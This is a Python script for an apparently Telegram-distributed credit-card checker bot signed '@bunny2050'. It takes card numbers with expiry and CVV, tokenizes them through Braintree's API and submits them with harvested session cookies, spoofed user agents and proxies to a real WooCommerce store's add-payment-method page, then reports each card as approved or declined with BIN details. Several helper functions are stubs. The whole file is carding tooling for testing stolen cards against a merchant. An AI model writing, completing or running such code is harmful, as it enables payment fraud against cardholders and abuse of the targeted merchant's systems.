import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
import random
import urllib3
import glob
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
SELECTED_COOKIE_PAIR = None
ALL_COOKIE_PAIRS = []
user = generate_user_agent()

def load_cookie_dicts_from_files():
    """Load all cookie dictionaries from cookies_*.txt files in this folder."""
    cookie_dicts = []
    # Look for both your provided filenames
    filenames = ["cookies_1-1.txt", "cookies_1-2.txt"]
    for fname in filenames:
        if os.path.isfile(fname):
            with open(fname, "r", encoding="utf-8") as f:
                text = f.read()
                match = re.search(r'cookies\s*=\s*({.*?})\s*$', text, re.DOTALL)
                if match:
                    cookie_str = match.group(1)
                    try:
                        cookie_dict = eval(cookie_str, {"__builtins__": {}})
                        cookie_dicts.append(cookie_dict)
                    except Exception as e:
                        print(f"Failed to parse cookies in {fname}: {e}")
    return cookie_dicts

def select_new_cookie_pair_silent():
    """Randomly selects a cookie pair from all loaded cookies."""
    global SELECTED_COOKIE_PAIR, ALL_COOKIE_PAIRS
    if not ALL_COOKIE_PAIRS:
        ALL_COOKIE_PAIRS = load_cookie_dicts_from_files()
    if not ALL_COOKIE_PAIRS:
        raise RuntimeError("No cookies loaded!")
    SELECTED_COOKIE_PAIR = random.choice(ALL_COOKIE_PAIRS)

def get_cookies_2():
    """Returns the currently selected cookie pair for requests."""
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    return SELECTED_COOKIE_PAIR

def get_domain_url():
    # You can customize this as needed
    return "https://www.calipercovers.com"

def get_headers():
    return {
        'user-agent': user,
        # ... add other headers as needed ...
    }

def get_new_auth():
    # TODO: Implement logic to obtain nonce and auth token
    return "fake_nonce", "fake_au"

def get_random_proxy():
    # TODO: Implement if needed, else return None
    return None

def check_status(message):
    # TODO: Parse message and return status, reason, approved flag
    if "success" in message.lower():
        return "APPROVED", "Success", True
    return "DECLINED", message, False

def get_bin_info(bin_code):
    # TODO: Lookup BIN info, stub for now
    return {
        "brand": "VISA",
        "type": "DEBIT",
        "level": "CLASSIC",
        "bank": "Test Bank",
        "country": "US",
        "emoji": "🇺🇸",
    }

def check_card(cc_line):
    select_new_cookie_pair_silent()
    start_time = time.time()
    try:
        domain_url = get_domain_url()
        cookies_2 = get_cookies_2()
        headers = get_headers()
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "❌ Authorization failed. Try again later.\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )

        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }
        proxy = get_random_proxy()
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False
        )
        if response.status_code != 200:
            return (
                "❌ <b>Braintree Auth</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"❌ Tokenization failed. Status: {response.status_code}\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
            )
        token = response.json()['data']['tokenizeCreditCard']['token']
        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        proxy = get_random_proxy()
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False
        )
        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        result = (
            f"{'✅' if approved else '❌'} <b>{status}</b>\n"
            f"<code>{n}|{mm}|{yy}|{cvc}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Gateway:</b> Braintree Auth\n"
            f"<b>Response:</b> {reason}\n"
            f"<b>BIN Info:</b> {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}\n"
            f"<b>Bank:</b> {bin_info.get('bank', 'UNKNOWN')}\n"
            f"<b>Country:</b> {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}\n"
            f"<b>Time:</b> {elapsed_time:.2f}s\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )
        return result

    except Exception as e:
        return (
            "❌ <b>Braintree Auth</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ Error: {str(e)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
        )

def parse_check_card_result(result_text, default_card="", default_time=""):
    import re
    card = default_card
    status_key = "declined"
    gateway = "Braintree Auth"
    response = ""
    bank = "Unknown Bank"
    country_flag = "🏳️"
    card_type = "Unknown"
    bin_code = "Unknown"
    check_time = default_time
    if "APPROVED" in result_text:
        status_key = "approved"
    elif "DECLINED" in result_text:
        status_key = "declined"
    elif "INSUFFICIENT FUNDS" in result_text.upper():
        status_key = "insufficient_funds"
    match_resp = re.search(r"<b>Response:</b>\s?(.*?)\n", result_text)
    if match_resp:
        response = match_resp.group(1).strip()
    match_bin = re.search(r"<b>BIN Info:</b>\s?(.*?)\n", result_text)
    if match_bin:
        card_type = match_bin.group(1).strip()
    match_bank = re.search(r"<b>Bank:</b>\s?(.*?)\n", result_text)
    if match_bank:
        bank = match_bank.group(1).strip()
    match_country = re.search(r"<b>Country:</b>\s?(.*?)\n", result_text)
    if match_country:
        country_flag = match_country.group(1).strip()
    match_card = re.search(r"<code>(\d{6})", result_text)
    if match_card:
        bin_code = match_card.group(1)
    if not card and match_card:
        card = match_card.group(0)
    match_time = re.search(r"<b>Time:</b>\s?([\d\.]+s)", result_text)
    if match_time:
        check_time = match_time.group(1)
    return {
        "card": card,
        "gateway": gateway,
        "status_key": status_key,
        "response": response,
        "bank": bank,
        "country_flag": country_flag,
        "card_type": card_type,
        "bin_code": bin_code,
        "check_time": check_time
    }
